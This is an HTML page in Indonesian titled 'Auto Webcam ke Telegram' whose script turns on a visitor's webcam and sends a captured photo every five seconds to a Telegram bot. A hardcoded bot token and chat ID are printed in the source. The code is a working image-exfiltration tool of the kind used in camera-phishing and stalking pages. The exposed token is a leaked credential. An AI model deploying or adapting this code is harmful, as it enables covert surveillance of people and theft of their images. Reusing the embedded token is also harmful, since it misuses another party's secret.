<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Auto Webcam ke Telegram</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      background: linear-gradient(135deg, #141e30, #243b55);
      color: #fff;
    }
    h1 {
      margin-bottom: 20px;
      font-size: 1.5rem;
    }
    video, canvas {
      border: 3px solid #00ff88;
      border-radius: 12px;
      max-width: 90vw;
      max-height: 50vh;
      margin-bottom: 15px;
      box-shadow: 0 0 15px rgba(0,255,136,0.6);
    }
    .status {
      margin-top: 10px;
      padding: 8px 14px;
      border-radius: 8px;
      font-size: 0.9rem;
      background: rgba(0,0,0,0.5);
    }
  </style>
</head>
<body>
  <h1>📷 Auto Webcam Capture & Kirim Telegram</h1>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <div class="status" id="status">Menunggu kamera...</div>

  <script>
    // === GANTI DENGAN TOKEN & CHAT_ID TELEGRAM ===
    const BOT_TOKEN = "7615994174:AAETE1PVcpz7ZCK8cf1yV23p6vCsveqzZVk";
    const CHAT_ID = "7065313128"; // bisa user id / grup id
    
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const statusEl = document.getElementById('status');
    const ctx = canvas.getContext('2d');

    // Minta akses webcam
    async function initCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        statusEl.textContent = "✅ Kamera aktif, mulai capture...";
        autoCapture();
      } catch (err) {
        statusEl.textContent = "❌ Akses kamera ditolak: " + err.message;
      }
    }

    // Capture foto dari video
    function captureFrame() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      return canvas.toDataURL("image/jpeg");
    }

    // Kirim foto ke Telegram
    async function sendToTelegram(imageData) {
      try {
        const blob = await (await fetch(imageData)).blob();
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob, "webcam.jpg");

        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: "POST",
          body: formData
        });

        if (res.ok) {
          statusEl.textContent = "📨 Foto terkirim ke Telegram!";
        } else {
          statusEl.textContent = "⚠️ Gagal kirim foto.";
        }
      } catch (err) {
        statusEl.textContent = "❌ Error: " + err.message;
      }
    }

    // Auto capture tiap 5 detik
    function autoCapture() {
      setInterval(() => {
        const img = captureFrame();
        sendToTelegram(img);
      }, 5000); // 5000ms = 5 detik
    }

    initCamera();
  </script>
</body>
</html>
